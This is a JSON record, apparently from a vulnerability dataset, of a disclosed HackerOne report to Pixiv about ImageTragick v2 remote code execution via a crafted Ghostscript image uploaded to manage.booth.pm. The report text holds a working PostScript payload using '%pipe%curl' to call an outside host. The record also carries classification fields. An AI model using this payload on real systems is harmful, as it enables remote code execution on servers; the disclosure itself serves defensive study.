@@ -1,0 +1,42 @@
+{
+  "reported_to": "pixiv",
+  "reported_by": "chaosbolt ",
+  "title": "RCE due to ImageTragick v2",
+  "content": "\nHello Pixiv team! Your Image processing process suffering from ImageTragick v2. Issue is caused by ghostscript RCE findnings.\nHow to reproduce:\nPATCH /design\nHost: manage.booth.pm\nsend following image:\nCode 363 Bytes\n1------WebKitFormBoundaryXX05yrKS4g8d9CWh\n2Content-Disposition: form-data; name=\"shop[header]\"; filename=\"imagetragick.jpeg\"\n3Content-Type: image/jpeg\n4\n5%!PS\n6userdict /setpagedevice undef\n7legal\n8{ null restore } stopped { pop } if\n9legal\n10mark /OutputFile (%pipe%curl https://avtohanter.ru/qwetest) currentdevice putdeviceprops\n11------WebKitFormBoundaryXX05yrKS4g8d9CWh--\nHow to fix:\nUpdate ImageMagick, should help\nImpact\nRemote Code Execution\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": 2000,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1615923300,
+  "report_url": "https://hackerone.com/reports/402362",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Prepare a malicious image file containing Ghostscript commands that execute a remote command (e.g., curl to an attacker-controlled server)."
+    ],
+    [
+      2,
+      "Upload the malicious image to the vulnerable endpoint (PATCH /design on manage.booth.pm) as part of a multipart form request."
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Remote Code Execution (RCE) flaw in the image processing service due to an outdated version of ImageMagick (specifically, the ImageTragick v2 issue). The exploit leverages Ghostscript's ability to execute arbitrary commands via specially crafted image files, allowing an attacker to run commands on the server by uploading a malicious image.",
+  "reason": "The attack is straightforward and involves a well-documented vulnerability (ImageTragick) with publicly available exploit techniques. The only complexity lies in crafting the malicious image file, but this is a known and documented process. The attack does not involve multiple components, subtle interactions, or complex application states.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an RCE in ImageMagick (ImageTragick v2) due to ghostscript, which is not related to authentication or authorization (AuthN/AuthZ) issues. The proposed methodologies focus on detecting IDOR and AuthN/AuthZ bypass vulnerabilities by analyzing user sessions, actions, and resource IDs within the same application context. Since this report is about a remote code execution vulnerability in image processing, it falls outside the scope of the described detection methods.",
+    "is_detectable": false
+  }
+}
